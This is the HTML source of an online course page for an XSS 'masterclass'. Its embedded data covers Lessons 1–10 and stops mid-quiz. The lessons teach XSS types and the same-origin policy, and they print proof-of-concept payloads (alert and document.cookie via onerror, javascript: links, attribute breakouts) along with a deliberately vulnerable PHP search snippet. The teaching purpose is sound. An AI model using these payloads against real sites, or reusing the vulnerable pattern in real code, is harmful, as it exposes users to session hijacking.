

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <title>Cross-Site Scripting (XSS) Attacks Masterclass Curriculum | CipherHall</title>
    <meta name="description" content="Begin your free, 50-lesson masterclass on Cross-Site Scripting (XSS). This curriculum covers exploitation, filter bypass, session hijacking, and modern defenses like CSP." />
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon.png" />
    <link rel="shortcut icon" href="/favicon.png" type="image/x-icon" />
    <link rel="apple-touch-icon" sizes="180x180" href="/favicon.png" />
    <link rel="canonical" href="https://www.cipherhall.com/courses/xss-attacks-roadmap.html" />

    <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "Course",
      "name": "Cross-Site Scripting (XSS) Attacks: A Masterclass",
      "description": "A comprehensive 50-lesson masterclass that takes you from the fundamentals of client-side security to advanced, real-world exploitation of Cross-Site Scripting.",
      "provider": {
        "@type": "Organization",
        "name": "CipherHall",
        "sameAs": "https://www.cipherhall.com"
      },
      "hasCourseInstance": {
        "@type": "CourseInstance",
        "courseMode": "Online",
        "instructor": {
          "@type": "Person",
          "name": "Dr. Anya 'innerHTML' Sharma"
        }
      }
    }
    </script>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&family=Exo+2:wght@700;800;900&display=swap" rel="stylesheet" />
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.39.7/dist/umd/supabase.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-core.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-okaidia.min.css" />
    <link rel="stylesheet" href="assets/css/coursepages.css">
</head>
  <body>
    <!-- Loading Screen -->
    <div id="loadingScreen" class="loading-screen">
      <div class="loader-icon">
        <i class="fas fa-graduation-cap"></i>
      </div>
      <div class="loader-text">Loading Course Content...</div>
    </div>

    <!-- Sidebar Overlay for Mobile -->
    <div class="sidebar-overlay" id="sidebarOverlay"></div>

    <!-- Music Player (fixed at top right) -->
    <div class="header-controls">
      <div class="music-dropdown" id="music-dropdown">
        <button class="btn btn-secondary">
          <span id="music-button-text">STUDY MUSIC</span>
          <i id="music-icon" class="fa-solid fa-music"></i>
        </button>
        <div class="music-dropdown-content" id="music-dropdown-content">
          <a
            href="#"
            data-src="https://www.learningcontainer.com/wp-content/uploads/2020/02/Kalimba.mp3"
            >1. Coffee Shop Vibes</a
          >
          <a
            href="#"
            data-src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-16.mp3"
            >2. City Lights Lofi</a
          >
          <a
            href="#"
            data-src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-15.mp3"
            >3. Mellow Thoughts</a
          >
          <a
            href="#"
            data-src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-13.mp3"
            >4. Rainy Mood</a
          >
          <a
            href="#"
            data-src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-10.mp3"
            >5. Time Alone</a
          >
          <a href="#" id="stop-music-link"
            ><i class="fa-solid fa-stop-circle"></i> Stop Music</a
          >
        </div>
      </div>

      <button class="btn btn-secondary" id="resetProgressBtn">
        <i class="fas fa-redo"></i>
        Reset Progress
      </button>
    </div>

    <!-- Auth Modal -->
    <div id="authModal" class="modal" style="display: none">
      <div class="modal-overlay"></div>
      <div class="modal-content">
        <span class="close" id="closeAuthModal">&times;</span>
        <div class="auth-tabs">
          <button id="tabSignIn" class="auth-tab active">Sign In</button>
          <button id="tabSignUp" class="auth-tab">Sign Up</button>
        </div>
        <div
          id="authLoader"
          style="display: none; text-align: center; padding: 2rem"
        >
          <i
            class="fas fa-spinner fa-spin fa-2x"
            style="color: var(--color-green)"
          ></i>
          <p style="margin-top: 0.5rem">Authenticating...</p>
        </div>
        <div id="signInForm" class="auth-form">
          <h2>Sign In to CyberSec Academy</h2>
          <button id="googleSignIn" class="btn btn-google">
            <i class="fab fa-google"></i> Continue with Google
          </button>
          <div class="divider"><span>or</span></div>
          <form id="emailSignInForm">
            <input
              type="email"
              id="signInEmail"
              placeholder="Email Address"
              required
            />
            <input
              type="password"
              id="signInPassword"
              placeholder="Password"
              required
            />
            <button type="submit" class="btn btn-primary">Sign In</button>
          </form>
        </div>
        <div id="signUpForm" class="auth-form" style="display: none">
          <h2>Join CyberSec Academy</h2>
          <button id="googleSignUp" class="btn btn-google">
            <i class="fab fa-google"></i> Continue with Google
          </button>
          <div class="divider"><span>or</span></div>
          <form id="emailSignUpForm">
            <input
              type="text"
              id="signUpName"
              placeholder="Full Name"
              required
            />
            <input
              type="email"
              id="signUpEmail"
              placeholder="Email Address"
              required
            />
            <input
              type="password"
              id="signUpPassword"
              placeholder="Password (min. 8 characters)"
              required
            />
            <button type="submit" class="btn btn-secondary">
              Create Account
            </button>
          </form>
        </div>
        <div id="authMessage"></div>
      </div>
    </div>

    <!-- Sidebar -->
    <aside class="sidebar" id="sidebar">
      <div class="sidebar-header">
        <div class="course-info">
          <h1 class="course-title" id="courseTitle">Loading...</h1>
          <div class="course-progress">
            <div class="progress-header">
              <span class="progress-label">Course Progress</span>
              <span class="progress-percentage" id="courseProgressPercent"
                >0%</span
              >
            </div>
            <div class="progress-bar">
              <div
                class="progress-fill"
                id="courseProgressFill"
                style="width: 0%"
              ></div>
            </div>
            <div class="progress-stats">
              <span id="completedLessons">0</span>
              <span id="totalLessons">0</span>
            </div>
          </div>
          <a href="/dashboard.html" class="back-to-dashboard">
            <i class="fas fa-arrow-left"></i>
            Back to Dashboard
          </a>
        </div>
      </div>

      <nav class="lesson-nav" id="lessonNav">
        <!-- Lessons will be loaded dynamically -->
      </nav>
    </aside>

    <!-- Main Content -->
    <main class="main-content">
      <header class="content-header">
        <div class="lesson-header">
          <div class="lesson-header-left">
            <span class="lesson-number" id="currentLessonNumber">1</span>
            <h1 class="lesson-header-title" id="currentLessonTitle">
              Loading...
            </h1>
          </div>
          <div class="lesson-actions">
            <button class="mbtn btn-primary" id="menuToggle">
              <i class="fas fa-bars"></i>
            </button>
          </div>
        </div>
      </header>

      <div class="content-body" id="contentBody">
        <div class="lesson-content" id="lessonContent">
          <!-- Lesson content will be loaded dynamically -->
        </div>
      </div>

      <footer class="lesson-navigation">
        <div class="nav-info" id="navInfo">Lesson 1 of 10</div>
        <div class="nav-controls">
          <button class="btn btn-secondary" id="prevLessonBtn" disabled>
            <i class="fas fa-chevron-left"></i>
            Previous
          </button>
          <button class="btn btn-primary" id="nextLessonBtn" disabled>
            Next
            <i class="fas fa-chevron-right"></i>
          </button>
        </div>
      </footer>
    </main>

    <!-- Achievement Notification -->
    <div id="achievementNotification" class="achievement-notification">
      <div class="notification-header">
        <div class="notification-icon" id="notificationIcon">
          <i class="fas fa-trophy"></i>
        </div>
        <div class="notification-content">
          <h3 id="notificationTitle">Achievement Unlocked!</h3>
          <p id="notificationDescription">Description here...</p>
        </div>
      </div>
      <div class="notification-reward" id="notificationReward">
        <i class="fas fa-coins"></i>
        <span id="notificationPoints">+100 Points</span>
      </div>
    </div>

    <!-- Toast Notification -->
    <div id="toast" class="toast">
      <span id="toastMessage"></span>
    </div>

    <script>
      // =====================================================
      // SYNCHRONIZED COURSE SYSTEM WITH DASHBOARD INTEGRATION
      // =====================================================

      // Supabase Configuration - Replace with your config
      const supabaseUrl = "https://lzcmzulemfubjaksoqor.supabase.co";
      const supabaseKey =
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imx6Y216dWxlbWZ1Ympha3NvcW9yIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTUzMzM5MDgsImV4cCI6MjA3MDkwOTkwOH0.crhPH4YWtRsr1BJTpAQcmPbWSpwIWRbzoI4sRb2_fPI";
      const supabase = window.supabase.createClient(supabaseUrl, supabaseKey);

      // =====================================================
      // COURSE DATA STRUCTURE - REPLACE WITH YOUR COURSE JSON
      // =====================================================
      const COURSE_DATA = {
        id: "cross-site-scripting",
        title: "Cross-Site Scripting (XSS) Attacks: A Masterclass",
        description:
          "A comprehensive 50-lesson masterclass that takes you from the fundamentals of client-side security to advanced, real-world exploitation of Cross-Site Scripting. You will learn to find, exploit, and defend against every category of XSS in modern web applications.",
        category: "application-security",
        difficulty: "Beginner to Advanced",
        duration: "100 hours",
        instructor: "Dr. Anya 'innerHTML' Sharma",
        lessons: [
          {
            id: "lesson-1-xss-fundamentals",
            title: "Lesson 1: XSS Fundamentals",
            duration: "120 min",
            objectives: [
              "Define Cross-Site Scripting and its root cause",
              "Classify the three main categories of XSS: Stored, Reflected, and DOM-based",
              "Assess the critical business impact of a successful XSS attack",
              "Differentiate XSS from server-side vulnerabilities like SQL Injection",
            ],
            content: {
              overview:
                "This foundational lesson introduces the most prevalent web vulnerability of the last decade: Cross-Site Scripting. We will define what XSS is, why it's so dangerous, and explore its three main categories. You will understand that XSS is fundamentally a client-side vulnerability that turns a trusted website into a delivery mechanism for an attacker's malicious code.",
              sections: [
                {
                  title: "Cross-Site Scripting: Betraying User Trust",
                  content:
                    "<p>Cross-Site Scripting (XSS) is a web security vulnerability that allows an attacker to inject malicious client-side scripts (usually JavaScript) into a web page viewed by other users. When another user loads the affected page, the malicious script executes within the context of their browser and the trusted origin of the vulnerable website.</p><h3>The Root Cause: Improper Output Encoding</h3><p>The fundamental flaw is that the application accepts user-supplied data and includes it in the HTML response sent to other users without properly encoding it. This failure to sanitize output allows an attacker's input to be interpreted by the victim's browser not as harmless text, but as active, executable code.</p>",
                  image:
                    "https://images.unsplash.com/photo-1515879218367-8466d910aaa4?w=800&h=400&fit-crop",
                },
                {
                  title: "XSS Attack Categories",
                  content:
                    "<p>XSS attacks are classified by how the malicious script is delivered to the victim's browser.</p><ul><li><strong>Stored (Persistent) XSS:</strong> The attacker's malicious script is permanently stored on the target server (e.g., in a database, a comment field, a user's profile). When any user visits the page that displays this stored content, their browser fetches and executes the script. This is the most dangerous type of XSS.</li><li><strong>Reflected XSS:</strong> The attacker's script is embedded in a URL and is 'reflected' off the web server to the victim's browser. The attacker must trick the victim into clicking a specially crafted link.</li><li><strong>DOM-based XSS:</strong> A subtle variant where the vulnerability exists entirely in the client-side code. The server is not involved; the application's own JavaScript takes data from a source (like a URL fragment) and insecurely writes it into the page's Document Object Model (DOM), causing the payload to execute.</li></ul>",
                  image:
                    "https://images.unsplash.com/photo-1555099962-4199c345e541?w=800&h=400&fit-crop",
                },
                {
                  title: "The Impact: Beyond Annoying Pop-ups",
                  content:
                    "<p>A successful XSS attack is not just about making a pop-up window appear. Because the attacker's script runs within the trusted origin of the vulnerable application, it has full access to anything that application can access in the user's browser.</p><h3>Critical Impacts:</h3><ul><li><strong>Session Hijacking:</strong> Stealing the user's session cookies, allowing the attacker to completely impersonate the user without needing their password.</li><li><strong>Credential Theft:</strong> Injecting a fake login form to harvest the user's credentials.</li><li><strong>Keylogging:</strong> Recording every keystroke the user types on the page.</li><li><strong>Browser Exploitation:</strong> Using the XSS as a foothold to launch more advanced attacks against the user's browser itself.</li></ul>",
                  image:
                    "https://images.unsplash.com/photo-1548092372-6a7e3206a5a2?w=800&h=400&fit=crop",
                },
              ],
            },
            quiz: {
              passingScore: 80,
              questions: [
                {
                  id: 1,
                  question:
                    "What is the fundamental root cause of Cross-Site Scripting (XSS)?",
                  options: [
                    "Weak password storage",
                    "Including untrusted user-supplied data in an HTML response without proper output encoding",
                    "Outdated software components",
                    "A misconfigured firewall",
                  ],
                  correct: 1,
                  explanation:
                    "The core problem is the failure to properly handle user-controlled output, allowing it to be interpreted as active code by the victim's browser. This is why output encoding is the primary defense.",
                },
                {
                  id: 2,
                  question:
                    "Which category of XSS is generally considered the most dangerous?",
                  options: [
                    "Reflected XSS",
                    "Stored (Persistent) XSS",
                    "DOM-based XSS",
                    "CSS-based XSS",
                  ],
                  correct: 1,
                  explanation:
                    "Stored XSS is the most dangerous because the malicious payload is saved on the server, affecting every user who views the contaminated page, and does not require a separate social engineering step (like clicking a link).",
                },
                {
                  id: 3,
                  question:
                    "Because an XSS payload executes in the victim's browser in the context of the trusted website, what is a primary goal for an attacker?",
                  options: [
                    "To crash the server",
                    "To steal the victim's session cookie",
                    "To deface the website",
                    "To delete the database",
                  ],
                  correct: 1,
                  explanation:
                    "Stealing the session cookie allows the attacker to hijack the victim's authenticated session, giving them full access to the victim's account and data.",
                },
              ],
            },
          },
          {
            id: "lesson-2-browser-security-model",
            title: "Lesson 2: Web Browser Security Model",
            duration: "120 min",
            objectives: [
              "Understand the Same-Origin Policy (SOP) as the foundation of web security",
              "Explore the Document Object Model (DOM) and how JavaScript interacts with it",
              "Differentiate between JavaScript execution contexts",
              "Recognize built-in browser security features like HttpOnly cookies and CSP",
            ],
            content: {
              overview:
                "To understand how to break a browser, you must first understand how it is designed to protect itself. This lesson covers the fundamental security model of the web browser, focusing on the Same-Origin Policy (SOP), the cornerstone that separates content from different sources and prevents malicious websites from stealing your data.",
              sections: [
                {
                  title: "The Same-Origin Policy (SOP)",
                  content:
                    "<p>The Same-Origin Policy is the single most important security concept in the browser. It is a strict rule that dictates that script from one 'origin' is not allowed to get or set properties of a document from a different 'origin'.</p><h3>What is an 'Origin'?</h3><p>An origin is defined by the combination of the **protocol**, **hostname**, and **port**.</p><ul><li>`https://example.com/page.html` and `https://example.com/other.html` have the **same origin**.</li><li>`http://example.com` and `https://example.com` have **different origins** (different protocol).</li><li>`https://www.example.com` and `https://api.example.com` have **different origins** (different hostname).</li></ul><p>The SOP is what prevents the JavaScript running on an attacker's malicious website from being able to make a request to read the contents of your open Gmail tab.</p><div class='info-box warning'><div class='info-box-header'><i class='fas fa-exclamation-triangle'></i><strong>XSS Bypasses SOP</strong></div><p>An XSS vulnerability is so dangerous because it completely bypasses the Same-Origin Policy. The attacker's script is executed *within the origin of the trusted site*, so it has full permission to do anything a legitimate script from that site could do, including reading data and sending it to the attacker.</p></div>",
                  image:
                    "https://images.unsplash.com/photo-1542626991-cbc4e32524cc?w=800&h=400&fit=crop",
                },
                {
                  title: "The Document Object Model (DOM)",
                  content:
                    "<p>The DOM is the in-memory, tree-like representation of a webpage. JavaScript can interact with the DOM to dynamically change the page's content, structure, and style. The functions that JavaScript uses to modify the DOM, like `innerHTML`, are known as 'sinks' and are the primary target for DOM-based XSS attacks.</p>",
                  image:
                    "https://images.unsplash.com/photo-1555099962-4199c345e541?w=800&h=400&fit-crop",
                },
              ],
            },
            quiz: {
              passingScore: 80,
              questions: [
                {
                  id: 1,
                  question:
                    "What is the primary function of the Same-Origin Policy?",
                  options: [
                    "To make websites faster",
                    "To prevent a script from one origin (e.g., evil.com) from accessing data from a different origin (e.g., your-bank.com)",
                    "To encrypt all web traffic",
                    "To manage user cookies",
                  ],
                  correct: 1,
                  explanation:
                    "The SOP is the fundamental security boundary within the browser, providing a strong guarantee of isolation between different websites.",
                },
                {
                  id: 2,
                  question:
                    "How does a Cross-Site Scripting (XSS) vulnerability fundamentally defeat the Same-Origin Policy?",
                  options: [
                    "It doesn't",
                    "By crashing the browser",
                    "By executing the attacker's script within the origin of the trusted, vulnerable website",
                    "By encrypting the cookie",
                  ],
                  correct: 2,
                  explanation:
                    "The script is delivered by the trusted origin, so from the browser's perspective, it *is* a legitimate script from that origin, granting it full access and bypassing the SOP entirely.",
                },
              ],
            },
          },
          {
            id: "lesson-3-html-js-basics",
            title: "Lesson 3: HTML and JavaScript Basics for Pentesters",
            duration: "120 min",
            objectives: [
              "Identify key HTML tags and attributes that can be used for XSS payloads",
              "Understand how JavaScript event handlers can be used to trigger malicious code",
              "Analyze how dynamic content is generated and where injection points may occur",
            ],
            content: {
              overview:
                "To craft effective XSS payloads, you need a solid understanding of the HTML and JavaScript constructs that can be used to execute code. This lesson is a practical review of HTML and JavaScript from the perspective of an attacker, focusing on the tags, attributes, and events that are the building blocks of XSS.",
              sections: [
                {
                  title: "HTML for Attackers",
                  content:
                    '<ul><li><strong>&lt;script&gt; tag:</strong> The most basic. Any content inside this tag is executed as JavaScript. <code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li><li><strong>Event Handlers:</strong> Many HTML tags have attributes that are event handlers. These are snippets of JavaScript that run when an event occurs. There are hundreds of them, like <code>onload</code>, <code>onerror</code>, <code>onmouseover</code>. <em>Example:</em> An attacker might inject an <code>&lt;img src=x onerror=alert(document.cookie)&gt;</code> tag. When the image fails to load, the <code>onerror</code> event will fire.</li><li><strong>&lt;a&gt; and &lt;iframe&gt; tags:</strong> Can be used with the <code>javascript:</code> pseudo-protocol. <code>&lt;a href=\\"javascript:alert(1)\\"&gt;Click me&lt;/a&gt;</code>.</li></ul>',
                  image:
                    "https://images.unsplash.com/photo-1517694712202-14261e80e3a5?w=800&h=400&fit=crop",
                },
              ],
            },
            codeExamples: [
              {
                title: "Classic <script> tag payload",
                language: "html",
                code: "&lt;script&gt;alert('XSS');&lt;/script&gt;",
              },
              {
                title: "Event handler payload using `onerror`",
                language: "html",
                code: '<!-- This is a common and stealthy way to get a payload to execute -->\n<img src=x onerror="alert(document.cookie)">',
              },
              {
                title: "Payload using the `javascript:` pseudo-protocol",
                language: "html",
                code: '<svg onload="alert(1)">\n\n<a href="javascript:confirm(\'You have been pwned\')">Click for a Prize!</a>',
              },
            ],
            quiz: {
              passingScore: 80,
              questions: [
                {
                  id: 1,
                  question:
                    "What is the purpose of an attacker using an `onerror` event handler in an XSS payload?",
                  options: [
                    "To make the page look better",
                    "To cause an error on the server",
                    "To trigger a JavaScript payload when an element (like a broken image) fails to load",
                    "To check the user's internet speed",
                  ],
                  correct: 2,
                  explanation:
                    "Event handlers are a very powerful tool for an attacker because they provide numerous ways to get JavaScript to execute in different contexts, often bypassing simple filters that just look for the `<script>` tag.",
                },
              ],
            },
          },
          {
            id: "lesson-4-attack-vectors",
            title: "Lesson 4: XSS Attack Vector Mapping",
            duration: "120 min",
            objectives: [
              "Systematically identify every point where user-controlled data is reflected in a response",
              "Analyze the output context to determine what kind of payload is required",
              "Trace the flow of data from input sources to output sinks",
            ],
            content: {
              overview:
                "Finding XSS is a methodical process. This lesson teaches you how to map out the attack surface of an application by identifying all the 'reflection points'—places where user input is echoed back in the server's response—and how to analyze the 'output context' to craft a tailored payload.",
              sections: [
                {
                  title: "Finding Reflection Points",
                  content:
                    "<p>A reflection point is any location in the application where your input appears in the output. To find them, you should submit a unique, easily searchable string (e.g., `XSSPROBE123`) into every possible input: URL parameters, POST body data, HTTP headers, etc. Then, you analyze the raw HTML of the response to see if `XSSPROBE123` appears anywhere. Every place it appears is a potential XSS vulnerability.</p>",
                  image:
                    "https://images.unsplash.com/photo-1555949963-aa79dcee981c?w=800&h=400&fit-crop",
                },
                {
                  title: "Output Context Analysis",
                  content:
                    '<p>Once you find a reflection point, you must analyze its context. Where in the HTML is your input being placed? The context determines what kind of payload you need.</p><h3>Key Contexts:</h3><ul><li><strong>HTML Body Context:</strong> <code>&lt;div&gt;Your input here&lt;/div&gt;</code>. This is the easiest. You can inject a <code>&lt;script&gt;</code> tag.</li><li><strong>HTML Attribute Context:</strong> <code>&lt;input type=\\"text\\" value=\\"Your input here\\"&gt;</code>. You can\'t use a <code>&lt;script&gt;</code> tag here. You need to break out of the attribute by using a <code>\\"</code> and then add an event handler: <code>\\" onmouseover=alert(1)</code>.</li><li><strong>JavaScript Context:</strong> <code>&lt;script&gt;var name = \\"Your input here\\";&lt;/script&gt;</code>. You need to break out of the string context and inject JavaScript code: <code>\\"; alert(1); //</code>.</li></ul>',
                  image:
                    "https://images.unsplash.com/photo-1517694712202-14261e80e3a5?w=800&h=400&fit-crop",
                },
              ],
            },
            quiz: {
              passingScore: 80,
              questions: [
                {
                  id: 1,
                  question:
                    "What does 'output context' refer to in XSS testing?",
                  options: [
                    "The type of server the application is running on",
                    "The programming language of the backend",
                    "The specific location in the HTML (e.g., inside a tag, in an attribute, in a script block) where user input is placed",
                    "The time of day the test is run",
                  ],
                  correct: 2,
                  explanation:
                    "Understanding the output context is absolutely critical for crafting a successful XSS payload. An HTML context payload will not work in a JavaScript string context, and vice-versa.",
                },
              ],
            },
          },
          {
            id: "lesson-5-reflected-xss",
            title: "Lesson 5: Reflected XSS Fundamentals",
            duration: "120 min",
            objectives: [
              "Understand the mechanics of non-persistent, reflected XSS attacks",
              "Exploit reflected XSS in URL parameters and form fields",
              "Craft social engineering lures to trick a victim into executing the payload",
            ],
            content: {
              overview:
                "This lesson provides a practical, hands-on introduction to the most common type of XSS: Reflected XSS. You will learn the full attack chain, from crafting a malicious URL to understanding the social engineering needed to get a victim to click it.",
              sections: [
                {
                  title: "The Reflected Attack Chain",
                  content:
                    "<h3>The Attack Flow:</h3><ol><li><strong>Discovery:</strong> The attacker finds a vulnerable reflection point. A classic example is a search function where the search term is reflected back on the results page without encoding.</li><li><strong>Payload Crafting:</strong> The attacker crafts a malicious URL that contains the XSS payload.</li><li><strong>Social Engineering:</strong> The attacker must now trick a victim who is authenticated to the vulnerable site into clicking this link. This can be done via a phishing email, a social media post, etc.</li><li><strong>Execution:</strong> The victim clicks the link. Their browser sends the malicious request to the trusted server. The server 'reflects' the payload back in the response. The victim's browser then executes the script, believing it came from the trusted server.</li></ol>",
                  image:
                    "https://images.unsplash.com/photo-1548092372-6a7e3206a5a2?w=800&h=400&fit-crop",
                },
              ],
            },
            quiz: {
              passingScore: 80,
              questions: [
                {
                  id: 1,
                  question:
                    "What is the defining characteristic of a Reflected XSS attack?",
                  options: [
                    "The payload is permanently stored in the database",
                    "The malicious payload is delivered to the victim via a link they are tricked into clicking, and the payload is 'reflected' off the server to the victim",
                    "The vulnerability exists entirely in the client-side code",
                    "It only affects search engines",
                  ],
                  correct: 1,
                  explanation:
                    "The payload is part of the request itself, and its execution requires a social engineering component to get the victim to make that request.",
                },
              ],
            },
          },
          {
            id: "lesson-6-get-based-xss",
            title: "Lesson 6: GET-Based Reflected XSS",
            duration: "120 min",
            objectives: [
              "Master the exploitation of reflected XSS in GET request query parameters",
              "Understand the importance of URL encoding for crafting payloads",
              "Exploit search functionality and other common GET-based reflection points",
            ],
            content: {
              overview:
                "GET-based XSS is the most classic and straightforward type of reflected attack. This lesson focuses on the hands-on mechanics of finding and exploiting these vulnerabilities in the URL query string.",
              sections: [
                {
                  title: "URL Encoding",
                  content:
                    "<p>When you craft a payload to be sent in a URL, special characters must be URL encoded to be transmitted correctly. For example, a space character becomes `%20`, and the `<` character becomes `%3C`. Your interception proxy and browser often handle this for you, but understanding it is key to crafting more complex bypasses.</p>",
                  image:
                    "https://images.unsplash.com/photo-1515879218367-8466d910aaa4?w=800&h=400&fit-crop",
                },
              ],
            },
            codeExamples: [
              {
                title: "URL with Unencoded Payload",
                language: "http",
                code: "https://example.com/search?q=&lt;script&gt;alert(1)&lt;/script&gt;",
              },
              {
                title: "URL with Properly Encoded Payload",
                language: "ttp",
                code: "https://example.com/search?q=%3Cscript%3Ealert(1)%3C/script%3E",
              },
              {
                title: "Vulnerable Search Functionality (PHP)",
                language: "php",
                code: "<?php\n$query = $_GET['q'];\necho \"<p>You searched for: $query</p>\"; // Vulnerable to Reflected XSS\n?>",
              },
            ],
            quiz: {
              passingScore: 80,
              questions: [
                {
                  id: 1,
                  question:
                    "A reflected XSS vulnerability where the payload is in the URL (e.g., `?search=<script>...`) is a:",
                  options: [
                    "POST-based XSS",
                    "GET-based XSS",
                    "Stored XSS",
                    "DOM-based XSS",
                  ],
                  correct: 1,
                  explanation:
                    "The HTTP GET method uses the URL query string to transmit data, making this a classic GET-based attack vector.",
                },
              ],
            },
          },
          {
            id: "lesson-7-post-based-xss",
            title: "Lesson 7: POST-Based Reflected XSS",
            duration: "120 min",
            objectives: [
              "Exploit reflected XSS in POST request body data",
              "Manipulate JSON and XML-based API requests to trigger XSS",
              "Understand the challenges of exploiting POST-based XSS",
            ],
            content: {
              overview:
                "In POST-based reflected XSS, the payload is sent in the body of an HTTP POST request rather than the URL. This makes the exploitation slightly more complex but just as severe. This lesson covers how to find and exploit these vulnerabilities.",
              sections: [
                {
                  title: "Exploitation Challenge",
                  content:
                    "<p>The challenge with POST-based XSS is that you cannot simply craft a malicious link. The payload must be delivered in a request body. To exploit this, an attacker has to create their own malicious webpage with a form on it. They then trick the victim into visiting their page, and use JavaScript to automatically submit the form to the vulnerable site in the background. The victim might not see anything happen, but the malicious POST request is sent from their browser (with their cookies), and the reflected payload can execute.</p>",
                  image:
                    "https://images.unsplash.com/photo-1498050108023-c5249f4df085?w=800&h=400&fit-crop",
                },
              ],
            },
            quiz: {
              passingScore: 80,
              questions: [
                {
                  id: 1,
                  question:
                    "What is the primary challenge in exploiting a POST-based reflected XSS vulnerability?",
                  options: [
                    "The payloads are longer",
                    "You cannot put the entire payload in a single link; you must create a malicious webpage that sends a POST request to exploit it",
                    "POST requests are always encrypted",
                    "POST requests are slower",
                  ],
                  correct: 1,
                  explanation:
                    "This requirement for an intermediary page makes exploitation slightly more involved than a simple GET-based XSS, but it is a standard and easily achievable technique for an attacker.",
                },
              ],
            },
          },
          {
            id: "lesson-8-http-header-xss",
            title: "Lesson 8: HTTP Header XSS",
            duration: "120 min",
            objectives: [
              "Identify vulnerabilities where HTTP headers like User-Agent and Referer are insecurely reflected",
              "Use an interception proxy to manipulate HTTP headers",
              "Exploit header-based XSS to achieve reflected XSS",
            ],
            content: {
              overview:
                "User-controlled data doesn't just come from URL parameters and form fields. The HTTP headers themselves are also attacker-controlled and a potential source of XSS. This lesson covers how to find and exploit these less-common, but still critical, header-based vulnerabilities.",
              sections: [
                {
                  title: "The Attack",
                  content:
                    "<p>Some applications might reflect the value of a header back in the page content. A common example is a user profile page that displays 'Your current user agent is: ...'. Since an attacker can set their User-Agent header to anything they want (using a proxy), they can inject a script into it. This is a form of reflected XSS. While it's harder for an attacker to get a victim's browser to send a request with a malicious header, it is possible and represents a valid vulnerability.</p>",
                  image:
                    "https://images.unsplash.com/photo-1555949963-aa79dcee981c?w=800&h=400&fit=crop",
                },
              ],
            },
            quiz: {
              passingScore: 80,
              questions: [
                {
                  id: 1,
                  question:
                    "Can HTTP headers like `User-Agent` be trusted by the server?",
                  options: [
                    "Yes, they are always accurate",
                    "No, they are client-controlled data and can be set to any arbitrary value by an attacker using a proxy",
                    "Only on weekends",
                    "Only if the connection is HTTPS",
                  ],
                  correct: 1,
                  explanation:
                    "Like any other part of the HTTP request, headers are fully controlled by the client and must be treated as untrusted data by the application.",
                },
              ],
            },
          },
          {
            id: "lesson-9-stored-xss",
            title: "Lesson 9: Stored XSS Fundamentals",
            duration: "120 min",
            objectives: [
              "Understand the mechanics and high impact of persistent XSS",
              "Identify common locations for stored XSS, like comment fields and user profiles",
              "Craft a payload that will be stored on the server and served to all users",
            ],
            content: {
              overview:
                "Stored XSS is the most dangerous form of Cross-Site Scripting. An attacker's payload is stored permanently on the server, and every user who views the contaminated page becomes a victim. This lesson covers the fundamentals of finding and exploiting these high-impact vulnerabilities.",
              sections: [
                {
                  title: "The Stored Attack Chain",
                  content:
                    "<ol><li><strong>Discovery:</strong> The attacker finds a feature that allows them to submit data that is then displayed to other users (e.g., a product review, a user profile bio, a forum post).</li><li><strong>Injection:</strong> The attacker submits their malicious XSS payload (e.g., a cookie-stealing script) as part of their submission. The application insecurely saves this raw script to its database.</li><li><strong>Execution:</strong> Later, a different user (including a high-privilege administrator) visits the page to view the reviews or profiles. The application retrieves the attacker's payload from the database and embeds it in the HTML. The victim's browser receives and executes the script, and their session cookie is sent to the attacker.</li></ol><p>The key here is that the injection and the execution are two separate events, and the attacker does not need to directly interact with the victim.</p>",
                  image:
                    "https://images.unsplash.com/photo-1542831371-d531d209121f?w=800&h=400&fit-crop",
                },
              ],
            },
            quiz: {
              passingScore: 80,
              questions: [
                {
                  id: 1,
                  question:
                    "What is the key difference between a stored XSS and a reflected XSS attack?",
                  options: [
                    "Stored XSS is less dangerous",
                    "In stored XSS, the malicious script is saved on the server, whereas in reflected XSS, it is delivered via a URL",
                    "Stored XSS only affects the attacker",
                    "Reflected XSS is more powerful",
                  ],
                  correct: 1,
                  explanation:
                    "This persistence is what makes stored XSS so potent. A single injection can compromise thousands of users over a long period.",
                },
              ],
            },
          },
          {
            id: "lesson-10-database-stored-xss",
            title: "Lesson 10: Database-Stored XSS",
            duration: "120 min",
            objectives: [
              "Identify common application features that store data in a database and are prone to XSS",
              "Exploit vulnerabilities in comment systems, user profiles, and message boards",
              "Understand how data stored from one user can impact another",
            ],
            content: {
              overview:
                "This lesson provides a deep, hands-on dive into the most common vector for stored XSS: features where user input is saved to a database. We will explore how to exploit these features to achieve persistent script execution.",
              sections: [
                {
                  title: "Classic Exploitation Scenarios",
                  content:
                    "<p>Any place where User A can enter text that will be seen by User B is a potential stored XSS vector.</p><h3>Example: User Profile</h3><ol><li>An attacker signs up for an account on a social media site.</li><li>In the 'Bio' or 'Website' field of their profile, they enter a JavaScript payload.</li><li>They save their profile. The application insecurely stores this script in the database.</li><li>Later, an administrator views the attacker's profile page.</li><li>The application retrieves the bio from the database and displays it on the page.</li><li>The attacker's script executes in the administrator's browser, potentially stealing their admin-level session cookie.</li></ol>",
                  image:
                    "https://images.unsplash.com/photo-1499750310107-5fef28a66643?w=800&h=400&fit=crop",
                },
              ],
            },
            quiz: {
              passingScore: 80,
              questions: [
